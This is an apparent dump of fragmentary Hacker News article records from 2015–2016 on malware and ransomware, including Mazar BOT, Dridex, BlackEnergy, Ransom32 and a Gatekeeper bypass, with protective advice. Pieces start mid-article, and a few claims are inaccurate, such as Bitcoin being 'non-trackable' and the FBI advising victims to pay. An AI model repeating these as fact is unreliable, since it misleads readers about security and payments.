United States, Croatia, Mali, Saudi Arabia, Mexico, Poland, Argentina and Serbia." }

Once again the heat was felt by the Los Angeles-based Presbyterian Medical Center when a group of hackers had sealed all its sensitive files and demanded $17,000 USD to regain the access to those compromised data. The devastation of the compromised files can be pitched as: Compromised emails Lockout Electronic Medical Record System [EMR] Encrypted patient data Unable to carry CT Scans of the admitted patients Ferried risky patients to nearby hospitals ...and much more unexplained outcomes. The hospital had confirmed that the Ransomware malware had hit its core heart a week before, potentially affecting the situation to grow much worse. Hospital End up Paying $17,000 As the situation was grown out of wild, the hospital paid 40 Bitcoins (Roughly US $17,000) to the Ransomware Criminals to resume their medical operations after gaining the decryption keys. \"The quickest and most efficient way to restore our systems and administrative functions was to pay the ransom and obtain the decryption key,\" the hospital CEO Allen Stefanek said in a letter. All the electronic medical system were restored back soon after unlocking the encrypted file locks. The Ransomware had stolen the nights of many network administrators, as they would be often blamed to fight up this nasty threat; instead of blaming staffs who click the illegit links in their e-mail. The FBI Advises Victims to Just Pay the Ransom Last year, even the FBI advised paying off the Ransom amount to the ransomware criminals as they had not come up with any other alternatives. Several companies had got webbed in the Ransomware business including a US Police Department that paid US $750 to ransomware criminals three years back. Criminals often demand the ransom in BTC (their intelligent move) for the surety of not getting caught, as Bitcoin transactions are non-trackable due to its decentralized nature. So until and unless a permanent solution evolves, users are requested not to click malicious or suspected links sent via an unknown person. The frequent payment to Ransomware encourages the hackers in the dark to stash the cash and develop a more enticing framework for the next target. But affecting a medical system is a heinous crime as hospitals are acting as a bridge between life and heaven." }

Dubbed Mazar BOT, the serious malware program is loaded with so many hidden capabilities that security researchers are calling it a dangerous malware that can turn your smartphone into a zombie inside hacker's botnet. Mazar BOT was discovered by Heimdal Security while the researchers at the firm were analyzing an SMS message sent to random mobile numbers and locations. How Mazar BOT Works Despite other Android malware that distributes itself by tricking users into installing an app from third-party app stores, Mazar spreads via a spam SMS or MMS messages that carry a link to a malicious APK (Android app file). Once the user clicks the given link, he/she'll be ending up downloading the APK file on their Android devices, which when run, prompts the user to install a new application. This new Android app has a generic name, MMS Messaging, that asks for admin level privileges. Most of the users end up giving the root access to the malicious app due to its common name. What Makes Mazar BOT So Nasty Once gaining root access on the victim's device, Mazar BOT can do variety of nasty stuff on your Android devices, like: Gain boot persistence to help survive device restarts Send and Read your SMS messages Make Calls to your contacts Read the phone's state Plague phone's control keys Infect your Chrome browser Change phone settings Force the phone into sleep mode Query the network status Access the Internet Wipe your device's storage (the most critical capabilities of all) Mazar BOT Browses Internet Anonymously Using TOR Besides these tasks, Mazar BOT can also download a legitimate TOR (The Onion Router) Android app on your smartphone and install it too, even without your consent or permission. Using TOR app, the malware would be able to surf the Internet anonymously via the Tor network. Once the malware installs TOR on victim's phone, Mazar BOT sends a \"Thank you\" message to an Iranian phone number (9876543210), along with the device's location. In some instances, Mazar BOT also installs an Android app called Polipo Proxy that establishes a proxy on the device, allowing the malware's author to spy on victim's Web traffic and carry out Man-in-the-Middle (MitM) attacks. Who is Behind This Awful Malware? Mazar BOT is believed to be distributed by a Russia-based group of cyber-criminals. One clue to this assumption is: Mazar BOT cannot be installed on Android smartphones in Russia, as its source code includes instructions on how to stop the malware installation process on phone configured with the Russian language. Another clue is: There is an unwritten law in Russia that says \"if cyber criminals don't go after Russians, Russian authorities will not go after them.\" Moreover, there is no such indication yet that this Mazar BOT campaign has affected anyone in Russia. Until now, Mazar BOT for Android has been advertised for sale on several Russian underground (Dark Web) forums, but this is the first time this creepy code has been abused in active attacks. How to Protect Yourself from Mazar BOT There are standard protection measures you need to follow to remain unaffected: NEVER click on links in SMS or MMS messages sent to your phone. Go to Settings → Security → Turn OFF \"Allow installation of apps from sources other than the Play Store\" option. Always keep an up-to-date Anti-virus app on your Android devices. Avoid unknown and unsecured Wi-Fi hotspots and Keep your Wi-Fi turned OFF when not in use." }
{ "_id" : { "$oid" : "5b35bfab6cefc42b00293556" }, "Category" : "Malware", "Title" : "Here's How to Decrypt Hydracrypt & Umbrecrypt Ransomware Files", "Address" : "https://thehackernews.com/2016/02/decrypt-ransomware-files.html", "Date" : "2016-02-12T23:31:00-11:00", "Article" : "Over the last few years, we have seen several types of Ransomware malware that demand a whopping amount of money from users for the retrieval of their locked, compromised sensitive files. We have also witnessed the birth of decryption solution for some of the Ransomware like Cryptolocker (partial), Coinvault, Rescue Kit. One more solution has recently been released for decryption of newly emerging ransomware, dubbed as Hydracrypt and Umbrecrypt that are propagated through Angler Exploit Kit. Both of the malware belong to CrypBoss ransomware family. The source code of CrypBoss Ransomware was leaked last year on Pastebin, which was later analyzed by Fabian Wosar, a security researcher at Emsisoft. With the help of CrypBoss Source code, Wosar was successfully able to crack the encryption algorithm of the ransomware and quickly made the decryption tool for CrypBoss and its variants (Hydracrypt and Umbrecrypt). It is found that both Hydracrypt and Umbrecrypt share the same genealogy which got traced back to CrypBoss Ransomware with small modifications in the implementation by its authors. \"Unfortunately the changes made by the HydraCrypt and UmbreCrypt authors cause up to 15 bytes at the end of the file to be damaged irrecoverably\" Wosar stated. The damaged bytes in the encrypted files are trivial (in most of the cases) since it would be used as a buffer data or some trailing bytes, which could easily be re-build by using any file repairing tool (for those 15 bytes). This doesn't affect much of the decryption process as 99 percent of the files are retrieved without any harm using the released decryptor tool that is available Free to download. How to Decrypt Ransomware Files? Double clicking the decryptor executable would initialize the decryption process, and you would get the key once the task gets completed. The time taken to crack the encryption would also depend upon your system's Flip-Flop power. Once the decryption key is generated, it is better to save it as a hard copy (by writing down in the paper). Now you can run the decryptor tool and select the intended folders to get unlocked. Enter the key once the decryptor tool prompts for it. To avoid a hotch-potch, users are advised to: Run the decryptor for a small number of files initially to check whether the decryption procedure is being executed properly. This would deliver the file ensurity and saves your time. Make sure whether enough space is present in the hard-drive, so as to take place the decryption. How to Ensure your Decrypted Data is Legit? However, the security team also stated that the result of the Decryption might not be correct as the ransomware, unfortunately, does not leave any information about the original file behind. To ensure the proper file recovery, initially you have to select the encrypted file along with its original version (somewhere in your cloud or anywhere) and pass it to the decryptor executable by a simple drag-and-drop. [Note: If you haven't found such, then users can also get a random encrypted file and a random PNG image off the Internet.] If the resultant output is legit, then you can carry out the same task with the remaining files. As the same algorithm is being followed in the remaining encrypted files, then you would get your files back as normal." }

Lizard Squad, the same group responsible for Sony PlayStation Network and Microsoft Xbox Live outages, uses their botnets to launch DDoS (Distributed Denial of Service) attacks against target websites to flood them with traffic and knock them offline.

Good Malware to Fight Bad Malware Lizard Squad sizable botnet contained somewhere between 120,000 and 150,000 bots, a Lizard spokesperson told Forbes, claiming that their botnet includes not just home routers and PCs, but smart refrigerators, smart TVs and other smart home devices as well. The White Team aims at hacking and protecting between 150,000 and 200,000 devices from Lizard Squad attacks, thereby removing the rogue gang from people's homes. However, the team of vigilante hackers face some hurdles, especially when working with the Wifatch malware, which is often too big to install on smaller routers. \"The goal is to use (most) of the 60,000 nodes we have to connect to the hundreds of thousands of boxes that are too small for our normal disinfector and disinfect them remotely,\" the hacker collective told the publication over encrypted email. Since there are so many vulnerable devices that can be hacked with little or no effort, these vigilante hackers aren't answer to this widespread problem. They can only help minimize the issue. The White Team is not the only team of vigilante hackers trying to secure the Internet. Just last week, a hacker replaced a malware with antivirus software. An anonymous hacker was found replacing Dridex, the most active banking malware, with the copies of Avira security software." }

A newly discovered Facebook hacking tool actually has the capability to hack Facebook account, but YOURS, and not the one you desire to hack. How to Hack Facebook account? How to Hack my Girlfriends Facebook account? My boyfriend is cheating on me, How do I hack his Facebook Account? These are the queries that most of the Internet users search on Google. But Beware! If you come across any Facebook hacking tool that promises you to help you hack your friends Facebook accounts, you may end up downloading a hacking tool that could hack you, instead of them. Facebook Hacking Tool that Can Really Hack, But Your Accounts Dubbed Remtasu, the tool is marketing itself as a Facebook hacking tool but actually is a Windows-based Trojan that has accelerated globally over the past year, and has now capability to disguise itself as an app for accessing people's Facebook account credentials. The tool contains a Keylogger that can capture all your keystrokes and store them in a file that is subsequently sent to the attacker's server. The malicious Facebook hacking tool is exploiting \"the constant desire of a lot of users to take control of accounts from this well-known social network,\" according to a Monday blog post by IT security company ESET. How Remtasu Works: The malicious tool is delivered via direct download websites. Once a user visits one of these websites, the dangerous Win32/Remtasu.Y malware automatically gets downloaded and executed on victim's machine and hide itself among other files. Remtasu has capability to: Open and obtain information from the clipboard. Capture keystrokes. Store all the data in a file which is subsequently sent to an FTP server. The worst part is yet to come: The malware remains on the infected computer even when the victim reboots their system or attempts to find the malware threat in the list of active processes. \"In this case, the malware replicates itself, saving the copy in a folder that it also creates within the system32 folder,\" reads the post. \"The new InstallDir folder remains hidden inside the system files, making it difficult for users to access.\" Most affected parts of the world include Colombia, Turkey, Thailand and elsewhere. In past, Remtasu was distributed through malicious files attached to phishing emails purporting to be from legitimate government or businesses organisations." }

In Feb 2015, a hacking group, known by the name METEL, successfully breached into the Russian Regional Bank for just 14 minutes and caused the exchange rate to fluctuate between 55 and 66 rubles per dollar, which finally resulted in the increment of Ruble’s value. Here's how they did it: According to Russian security firm, Group-IB, who investigated the incident, the Metel Hacking group infected Kazan-based Energobank with a virus known as the Corkow Trojan and placed more than $500 million in orders at non-market rates. “This is the first documented attack using this virus, and it has the potential to do much more damage,” Dmitry Volkov, the head of Group-IB’s cyber intelligence department, told Bloomberg. The hackers had taken the advantage of Spear Phishing Technique, which appears to come from a legit source. A single click on the link in the malicious mail took over the access to the system followed by ultimate exploitation. After gaining the access to a local system, the trojan was able to cause a havoc deepening the attack to its Intranet. This way, the malware named Corkow found the isolated system which handles the money transaction exclusively to the outer world. Corkow malware, initially discovered in 2011, regularly updates itself to evade detection by antivirus programs, and has infiltrated more than 250,000 computers worldwide and infected at least 100 financial institutions. Bank lost 244 Million Rubles ($3.2 million) The Energobank claimed losses of 244 million rubles ($3.2 million) due to the trades. But, the Moscow Exchange had denied the allegations of any hacking attempt by the fact that; the changes in the Stock Market would be an output of Trader’s mistakes. They also not found any hint of currency manipulation. The attack was earlier ported to target ATMs of Russia, affecting Russian bank card system that resulted in hundreds of millions of rubles being stolen via ATMs in August. Another attack with the same malware also facilitated hackers to use credit card limitlessly. Metel is only known to be active in Russia (affected 73% Russian Banks), although it may present a threat to financial institutions across the globe. Authority has not yet handcuffed any of its criminals who are raising a global bank threat." }

According to the Russian authorities, 25th Floor was allegedly involved in distributing the notorious password-stealing malware known as Dyre Banking Trojan. Malware Costs Hundreds of $$$ Millions in Losses The Dyre banking Trojan was typically distributed via spam campaigns and was responsible for over hundreds of millions of dollars in losses at banking and financial institutions, including Bank of America Corp, PayPal, and JPMorgan Chase & Co. Dyre, also known as Dyreza, first appeared in July 2014 and updated to target Windows 10 systems and its newest Edge browser. However, Dyre has not been in use since the November raid, according to cyber security experts, who said the raid represents Russia's biggest effort up to date in cracking down on cyber crime. It is yet not known whether the Russian authorities anyone has arrested or charged anyone linked to the raid. However, the sources familiar with the matter told Reuters that the Dyre investigation was aided by security firm Kaspersky Lab that would reveal details about the case at its annual conference for security experts starting Sunday. The malware authors used a variety of techniques to deliver Dyre malware onto victim's web browser in an effort to alter the communication between customers and over 400 financial institutions. They Producing Cyber-Crime Thriller Movie — BOTNET The name came out from the November raid: 25th Floor that distributes movies and Television shows in Russia and other East European and near-east countries. The company is currently busy in the production of a film called BOTNET – a cyber crime thriller based on a 2010 case in which 37 people from the United States and other countries were charged for a $3 Million scam. 25th Floor hired Moscow-based computer security company Group-IB to advise the Botnet director and writers on the detailed aspects of cybercrime, said Group-IB CEO Ilya Sachkov. He said he was initially approached by Nikolay Volchkov, the CEO of 25th Floor. Then Sachkov got an urgent call from Volchkov last November, saying he needed to meet. \"He was afraid. His color was totally white,\" added Sachkov. \"He knows there's an ongoing investigation about cybercrime.\" To know how the Dyre banking malware works and how you can protect yourself against the malware, you can read this The Hacker News article." }

A portion of the Dridex banking Trojan botnet may have been hacked or compromised by an unknown Whitehat Hacker, who replaced the malicious links with Avira Antivirus installers. What is Dridex Banking Trojan? How it Works? Dridex malware – also known as Bugat and Cridex – is believed to have been created by cyber criminals in Eastern Europe in an effort to harvest online banking details. Even after a high-profile takedown operation in late 2015, the Dridex botnet seems to be active again. The Dridex virus typically distributes itself through spam messages or emails that include malicious attachments, most often a Microsoft Office file or Word document integrated with malicious macros. Once the malicious file has been clicked, the macros download and install the main payload of the virus – the trojan program itself – from a hijacked server, which installs and runs on the victim's computer. The Dridex trojan program then creates a keylogger on the infected machine and manipulates banking websites with the help of transparent redirects and web-injects. This results in stealing victim's personal data like usernames and passwords, with an ultimate aim to break into bank accounts and siphon off cash. Hacker replaces Trojan with Anti-virus However, the recent Hack Surprises: Instead of distributing banking trojan, a portion of the Dridex botnet currently seems to be spreading legitimate copies of the free anti-virus software from Avira, as the company has announced itself. \"The content behind the malware download [link] has been replaced, it is now providing [a legitimate], up-to-date Avira web installer instead of the usual Dridex loader,\" explained Avira malware expert Moritz Kroll, reported Reg. Avira believes that the white hat hacker or hackers may have hacked into a portion of infected web servers using the same flaws the malware authors used and then replaced the malicious code with the Avira installer. So, once infected, instead of receiving Dridex malware, the victims get a valid, signed copy of Avira antivirus software. \"We still don't know exactly who is doing this with our installer and why – but we have some theories,\" said Kroll. \"This is certainly not something we are doing ourselves.\" Although the motives behind including the Avira software is still unclear, these kinds of actions are considered to be illegal in many countries, said Kroll. What can be done to protect From Malware Attacks? The guidance for preventing yourself from being a part of the Dridex Banking Trojan botnet is: Ensure you have an updated antivirus program running on your PC, which should be able to intercept the malicious attachments before they are opened. One of the best measures for securing your online environment is to deploy an Intrusion Detection System (IDS) at the network layer, which is especially useful to quickly detect malware and other threats in your network when integrated with a real-time threat intelligence and SIEM (Security Intelligence and Event Monitoring) solution, such as AlienVault Unified Security Management (USM). Be careful of opening email attachments sent from an unknown email address, particularly (in this case) Microsoft Word and Excel files. Disable Macros in MS Office, or at least set the Macros to request permission before they run." }

Yes, it is possible, and you could end up downloading malware on your iPhone or iPad. Unlike Google, Apple has made remarkable efforts to create and maintain a healthy and clean ecosystem of its official App Store. Although Apple's review process and standards for security and integrity are intended to protect iOS users, developers found the process time consuming and extremely frustrating while issuing a patch for a severe bug or security flaw impacting existing app users. To overcome this problem, Apple designed a set of solutions to make it easier for iOS app developers to push straightway out hotfixes and updates to app users without going through Apple's review process. Sounds great, but here's the Kick: Malicious app developers can abuse These solutions, potentially allowing them to circumvent effectively the protection given by the official App Store review process and perform arbitrary actions on the compromised device, FireEye has warned. The framework in question is JSPatch – a small JavaScript-to-ObjectiveC engine that developers can integrate in their iOS apps, allowing them to apply hotfixes on their iOS apps simply by adding a few lines of code to their apps. How Does JSPatch Work? Once the JSPatch engine loads inside an application, the developer can configure the app always to load a JavaScript file hosted on a remote server, which is controlled by the developer. Developed by a Chinese developer, JSPatch is utilised in as many as 1,220 iOS apps in the App Store, according to researchers. Although they failed to name the apps, the researchers claim that they have already notified the app providers. So, in need of security fixes or updates to their app, instead of going through Apple's long-winded update routine, developers can just add some JavaScript code to the file hosted on their server in order to load the code in all the devices where the app is installed. How to Exploit the JSPatch Framework? There are two ways to abuse this framework: If the Developer is with malicious intention. If developer loads this framework via an unencrypted channel, allowing Man-in-the-Middle attacks. What if the app developer has bad intention? A malicious developer can first submit a harmless JSPatch integrated application to the Apple App Store. Once it passed Apple's inspection and made available on the App Store for users to download, the developer can then easily send malicious JavaScript code to the running application through JSPatch, allowing the developer to perform various actions without being detected. \"JSPatch is a boon to iOS developers,\" FireEye researchers said in a blog post. \"In the right hands, it can be used to quickly and effectively deploy patches and code updates. However, in a non-utopian world like ours, we need to assume that bad actors will leverage this technology for unintended purposes.\" What if the app's developer loads JSPatch via an unencrypted channel? If an application developer uses JSPatch without any malicious intentions, even then the users security is at risk. The developers who load JSPatch via an unencrypted (HTTP) channel could leave communications between the client and the server unprotected. This could allow an attacker to conduct a man-in-the-middle (MitM) attack to intercept the client and server connection and tamper with the JavaScript content sent to the app in order to perform a malicious action, including: Access to sensitive information, such as media files and the pasteboard content. Change system properties. Load arbitrary public frameworks into the app process. This isn't the very first-time iOS users are facing such problems. Last October, hundreds of iOS apps in the App Store were found collecting user's private data while violating security and privacy guidelines of Apple. The discovery came just a month after the XcodeGhost malware was distributed through legitimate iOS Apps via counterfeit versions of Apple's app developer toolkit called Xcode. Here's how to protect yourself against XCodeGhost like iOS flaws. How to Protect Yourself? The recommendations to protect yourself against this flaw are standard: Download apps only from the official App Store, that you need, that you know, and that you trust. Beware of applications that ask for an extensive amount of permissions and only grant the apps permissions that are necessary. Manually review \"everything\" to discover anything malicious in your devices. Rest is up to the company if it wants to improve its application update process to make it speedier, or to allow potential attack vectors that could affect most of its apps and their users." }

Last year, The Hacker News reported a deadly simple exploit that completely bypassed one of the core security features in Mac OS X known as Gatekeeper. Apple released a patch in November, but now the same security researcher who discovered the original Gatekeeper bypass vulnerability said he found an equally obvious workaround. Patrick Wardle, ex-NSA staffer and head of research at security intelligence firm Synack, said the security patch released by Apple was \"incredibly weak\" and that the update was \"easy to bypass\" in minutes. Gatekeeper's Failure Once Again Introduced in July of 2012, Gatekeeper is Apple's anti-malware feature designed to block untrusted, dodgy apps from running, keeping Mac OS X systems safe from malware. However, the reality is slightly different, according to Wardle. Hackers can install malicious software on Mac computers, even when Gatekeeper is set to its most restrictive setting. \"Even on a fully-patched OS X 10.11.2 system, Gatekeeper is trivial to bypass,\" Wardle wrote in a blog post. \"So hackers can (re)start their trojan distributions while nation states can get back to MitM’ing HTTP downloads from the internet.\" In September, Wardle realized that before allowing any apps to execute on an OS X machine, Gatekeeper performs a number of checks, such as: Checking the initial digital certificate of a downloaded app Ensuring the app has been signed with an Apple-recognized developer certificate Ensuring the app has been originated from the official App Store But, what Gatekeeper fails to check is – whether the app already trusted by OS X runs or loads other files from the same folder. However, in the name of a security patch, all Apple did was simply blacklist the signed apps Wardle was abusing to bypass Gatekeeper, rather than fixing the underlying problem. How to Bypass Gatekeeper in OS X? This was not effective in preventing attacks. Wardle found a new Apple-signed file that allow him to do the same. Notably, the file was offered by the popular anti-virus firm Kaspersky Labs. All Wardle has done is: Identified an already-signed binary file (Binary A) that runs a separate app (Binary B) located in the same folder Renamed Binary A Swapped out the legitimate Binary B with a malicious one Then bundled malicious file in the same folder under the same file name, Binary B Now, Binary B needs no digital certificate or Apple developer certificate to run, so it can be used to install anything the attacker wants, completely bypassing Gatekeeper. Wardle notified Apple about his latest finding, and the company rolled out an update blocking the new files Wardle privately reported it, which is not a right approach. Apple should come up with a more comprehensive fix to address the issue. How to Protect Yourself? In the meantime, Wardle suggested Mac users to only download software from the Mac App Store and be more careful while downloading apps from the internet. Wardle will be presenting his findings at the Shmoocon conference in Washington D.C this weekend. He also released a complementary tool for Gatekeeper on Friday, a free tool dubbed Ostiarius, that checks all file executions and blocks untrusted, unsigned code originating from the Web. Alternatively, otherwise, it might be time to fire Gatekeeper, and hire a new one." }

It was so obvious as I stressed earlier that the Let's Encrypt free HTTPS certificates would not just help legitimate website operators to encrypt its users' traffic, but also help criminals to bother innocent users with malware through secure sites. Let's Encrypt allows anyone to obtain free SSL/TLS (Secure Socket Layer/Transport Layer Security) certificates for their web servers that encrypt all the Internet traffic passed between a server and users. Let's Encrypt is recognized by all major browsers, including Google's Chrome, Mozilla's Firefox and Microsoft's Internet Explorer. The organization started offering Free HTTPS certs to everyone from last month, and it is very easy for anyone to set up an HTTPS website in a few simple steps (How to Install Free SSL Cert). However, the most bothersome part is that Let's Encrypt free SSL certs are not only used by website owners to secure its users connection but also abused by cyber criminals to spread malware onto computers. How Criminals are Abusing Let's Encrypt Certificates? Researchers from Trend Micro spotted a Malvertising Campaign on Dec. 21 that was installing banking malware on computers and using free SSL certificates issued by the Let's Encrypt to hide its malicious traffic. Malvertising is a technique of using Web ads to spread malware. By stealthy inserting malicious advertisements on legitimate websites, malware authors can redirect users to malicious sites to deliver malware payload with the help of an exploit kit. For a long time, malware authors purchased stolen SSL certificates from the underground market and deployed them in their malvertising campaigns. Fortunately, these certificates are eventually caught up and invalidate by their legitimate owners. However, with the launch of Let's Encrypt free SSL certificates, malware authors don't even have to pay for SSL certificates anymore, and can request one for free instead. Criminals Delivering Vawtrack Banking Trojan The malvertising campaign discovered by Trend Micro researchers lasted until December 31 and affected users located mainly in Japan. People in Japan were delivered malicious ads that redirect them to a malicious website serving up malware over encrypted HTTPS using a Let's Encrypt-issued certificate. The malicious website used the Angler Exploit Kit in order to infect victims’ computers with the nasty Vawtrack banking trojan, which is specially designed to raid their online bank accounts. Before installing the Let's Encrypt certificate, the attackers behind this campaign compromised an unnamed legitimate web server and set up their own subdomain for the server's website, said Joseph Chen, Fraud Researcher at Trend Micro. The cyber crooks then installed the Let's Encrypt cert on the compromised server and hosted a malicious advertisement (also contained anti-antivirus code) from that subdomain. The Actual Cause behind the Abuse of Let's Encrypt Certs The issue is Let's Encrypt only checks the main domain against the Google's Safe Browsing API to see if a domain for which an SSL certificate is requested has been flagged for malware or phishing. However, Let's Encrypt never check for shadow domains like in this case in which authors of the malvertising campaign easily requested and got approved for a Let's Encrypt certificate. Moreover, Let's Encrypt has a policy not to revoke certificates. The organization explained in October that certification authorities are not equipped to police content and certificates issued by them 'say nothing else about a site’s content or who runs it'. \"Domain Validation (DV) certificates do not include any information about a website’s reputation, real-world identity, or safety.\" However Trend Micro disagrees with this approach, saying, certificate authorities (CAs) \"should be willing to cancel certificates issued to illicit parties that have been abused by various threat actors.\" In other words, there should be some mechanisms to prevent unauthorized certificates registrations for domains as well as their subdomains. How can You Prevent Yourself From Such Attacks? Trend Micro has reached out to both the Let's Encrypt project, and the legitimate domain's owner to notify them about the malvertising campaign. And Here's your take: Users should be aware that a 'secure' website is not always or necessarily a safe website, and the best defense against exploit kits is still an easy go, i.e.: Always keep your software up-to-date to minimize the number of vulnerabilities that may be exploited by cyber criminals.

Now once again, hackers have used highly destructive malware and infected, at least, three regional power authorities in Ukraine, causing blackouts across the Ivano-Frankivsk region of Ukraine on 23rd December. The energy ministry confirmed it was investigating claims a cyber attack disrupted local energy provider Prykarpattyaoblenergo, causing the power outage that left half of the homes in Ivano-Frankivsk without electricity just before Christmas. According to a Ukrainian news service TSN, the outage was the result of nasty malware that disconnected electrical substations.

First Malware to Cause Power Outage On Monday, researchers from antivirus provider ESET confirmed that multiple power authorities in Ukraine were infected by \"BlackEnergy\" trojan. BlackEnergy Trojan was first discovered in 2007 as a relatively simple tool to conduct Distributed Denial of Service (DDoS) attacks but was updated two years ago to add a host of new features, including the ability to render infected computers unbootable. The malware was launched by \"Russian security services\" with it being used against industrial control systems and politically sensitive targets, the SBU state intelligence service said in a statement on Monday. According to ESET, the malware was recently updated again to add a new component called KillDisk and a backdoored secure shell (SSH) utility that gives hackers permanent access to infected computers. Also Read: This 'Killer USB' can make your Computer explode The KillDisk module enables the BlackEnergy malware to destroy critical parts of a computer hard drive and to sabotage industrial control systems, the same used in attacks against Ukrainian news media companies and the electrical power industry. \"The first known case where the KillDisk component of BlackEnergy was used was documented by CERT-UA in November 2015,\" Anton Cherepanov of ESET wrote in a blog post. \"In that instance, a number of news media companies were attacked at the time of the 2015 Ukrainian local elections. The report claims that a large number of video materials and various documents were destroyed as a result of the attack.\" How Did Hackers Cause Blackouts? Researchers said hackers had used backdoors to spread the KillDisk wiper module through booby-trapped macro functions embedded in Microsoft Office documents across the Ukrainian power authorities. Therefore, it is believed that the initial point of infection with BlackEnergy caused after employees opened Microsoft Office files containing malicious macros.

It is really disturbing that industrial control systems used to supply power to Millions of homes could be infected using such a simple social-engineering trick. Moreover, the most concerning part is that the BlackEnergy malware is now being used to create power failures that can even have life-and-death consequences for large numbers of people. Ukrainian authorities are investigating the hacking attack on its power grid. For more technical details about the latest BlackEnergy package, you can read on ESET blog." }

A new Ransomware-as-a-service, dubbed Ransom32, has been spotted that for the first time uses a ransomware written in JavaScript to infect Mac, Windows as well as Linux machines. Ransom32 allows its operators to deploy the malware very quickly and easily. It has a dashboard that enables operators to designate their Bitcoin addresses to which the ransom can be sent. The dashboard also shows stats about how much Bitcoins they have made. In short, this new ransomware-as-a-service is so simple, and efficient at the same time, that anyone can download and distribute his/her own copy of the ransomware executable as long as he/she have a Bitcoin address. The copy of Ransom32 was first analysed by Emsisoft, which found that the new ransomware family, which embedded in a self-extracting WinRAR archive, is using the NW.js platform for infiltrating the victims' computers, and then holding their files by encrypting them with 128-bit AES encryption. Also Read: Free Ransomware Decryption and Malware Removal ToolKit But, Why the NW.js Framework? NW.js, formerly known as Node-WebKit, is a JavaScript framework for app development based on Node.js and Chromium. It works around normally-strict sandboxing of JavaScript, so a Web app can be repurposed for desktops without the sandbox getting in its way. \"NW.js allows for much more control and interaction with the underlying operating system (OS), enabling JavaScript to do almost everything 'normal' programming languages like C++ or Delphi can do,\" Emsisoft's Fabian Wosar writes. The NW.js framework not only allows for cross-platform infections but also is harder to detect because it is a legitimate framework. Ransom32 has some resemblance to CryptoLocker that is one of the nasty ransomware that already infected millions of PCs. Ransom32 has been traded on the dark web with the authors asking for a 25 percent cut of all ransom payments for offering its service and forwarding the rest of the amount to the operator’s Bitcoin address. Also Read: Free CryptoLocker Ransomware Decryption Tool Released How Does Ransom32 Work? Malware operators place the malicious file inside emails masquerading as delivery notifications, unpaid invoices, and such. As soon as it was installed and launched, Ransom32 connected to a command-and-control (C&C) server on TOR anonymising network, displaying ransom note as shown above and the Bitcoin address where victims are supposed to pay to recover their files. Currently, Wosar has only seen Ransom32 as a Windows attack vector, but the NW.js framework can run on all three major operating systems. Therefore, ransomware coded to work on top of NW.js would theoretically be able to target Mac OS X as well as Linux operating systems. How to Protect Yourself from Ransomware Threat?

The Raspberry Pi is an extremely simple computer that looks and feels very basic, but could be built into many geeky projects. Due to the low-cost appeal of the Raspberry Pi, the Foundation has sold over 4 million units.

Security researchers have uncovered a sophisticated payment card malware that executes before the operating system boots, making the malware very difficult to detect and much less remove. The malware in question is part of \"Nemesis\" – a malware suite that includes all software programs for capturing screens, transferring files, injecting processes, logging keystrokes, and carrying out other malicious activities on the infected computers. Nemesis malware family has been seen in the past, targeting banks, ATMs, financial transaction processing, credit unions, and financial business service companies. Nemesis Bootkit Malware – Reappears even after Re-installation of the OS The malware with bootkit functionality has been in operation since early this year and has the ability to modify the legitimate VBR (Volume Boot Record) that makes the malware possible to load before Windows starts. This makes the malicious threat hard to detect and remove using traditional security approaches. Moreover, the malware resides in a low-level portion of a hard drive. This makes the malware infection reappears even after the complete reinstallation of the Windows operating system. \"The malware that persists outside of the operating system (OS) requires a different approach to detection and eradication,\" security analysts from FireEye wrote in a blog post published Monday. \"Malware with bootkit functionality can be installed and executed almost entirely independent of the Windows [OS]. As a result, incident responders will need tools that can access and search raw disks at scale for evidence of bootkits.\" How Does the Malware Work? Early this year, the cyber criminals tweaked Nemesis to include a utility called BOOTRASH that has the ability to modify an infected computer’s boot process. In a normal boot, any Windows PC reads data from a hard drive's MBR (Master Boot Record) that loads the VBR – a piece of code specific to an operating system containing instructions for the OS to begin the boot process. The process typically looks like this: The VBR then normally loads the operating system code, but BOOTRASH loads: First, the malicious code that injects the Nemesis components stored in the virtual file system into the Windows kernel Then the Operating System code Since BOOTRASH is loaded outside of the machine's OS, it is not subject to any kind of integrity checks, nor are any of its components scanned by system's Anti-Virus program, which helps the malware evade detection. According to the researchers, versions of BOOTRASH are targeting both 32-bit and 64-bit Windows architectures. Moreover, due to this newly added Bootkit component, reinstalling the OS will not remove the Nemesis malware. Hackers behind Nemesis Malware FireEye researchers believe the Nemesis bootkit malware belongs to a financial crime group of hackers, likely based in Russia, called FIN1. \"We identified the presence of a financially motivated threat group that we track as FIN1, whose activity at the organization dated back several years,\" FireEye researcher wrote. \"The threat group deployed numerous malicious files and utilities, all of which were part of a malware ecosystem referred to as ‘Nemesis’ by the malware developer(s).\" The researchers believe that the FIN1 hacking group used this malware, most of the times, to access victims environment and steal cardholders data. In the past, the researchers came across different versions of the Nemesis family when they analyzed FIN1's malware. How to Protect Your Systems From Nemesis Bootkit Malware? Re-installing the operating system of your Windows machine is not a sufficient method to get rid of this malware. The solution against this malware threat is to use software tools that can access and scan raw disks at scale for evidence of Bootkits, or physically wipe the disks before reinstalling the operating system. \"System administrators should perform a complete physical wipe of any systems compromised with a bootkit and then reload the operating system,\" FireEye researchers recommend. Nemesis is by no means the first malware family to hijack normal boot process of a PC in an effort to gain persistence and stealth, but it is not the first malware family that contains bootkit functionality. In the past, researchers detected malicious threats such as TDL4 (Olmarik), Rovnix, Necurs, and Carberp. Among these, Carberp banking trojan targeted financial institutions." }

Yes, stealing Windows users' passwords before encrypting their data and locking their PCs for ransom makes this upgrade to the Angler Exploit Kit nastier. Here's How the New Threat Works: Once the Angler exploit kit finds a vulnerable application, such as Adobe Flash, in visitor's computer, the kit delivers its malicious payloads, according to a blog post published by Heimdal Security. The First Payload infects the victim's PC with a widely used data thief exploit known as Pony that systematically harvests all login usernames and passwords stored on the infected system and then sends them to servers controlled by hackers. This allows attackers to obtain working logins for a number of websites, e-commerce sites, and even corporate applications, from which the hackers could steal more data.

Over 100 web pages in Denmark have been \"injected with the malicious scripts, but the campaign is not limited to Europe.\" Rise in Ransomware Threat Ransomware attacks hit thousands of Internet users every week, and costs them a total of $18 Million in losses, according to the FBI.

Until recently, Cryptowall 4.0 has been distributed only via malicious spam and phishing emails, but now it has been infecting machines via an Exploit Kit. SANS security researcher Brad Duncan wrote in a blog post published Tuesday that a cyber criminal working off domains belonging to Chinese registrar BizCN has been spreading the Cryptowall 4.0 ransomware via the Nuclear Exploit Kit.

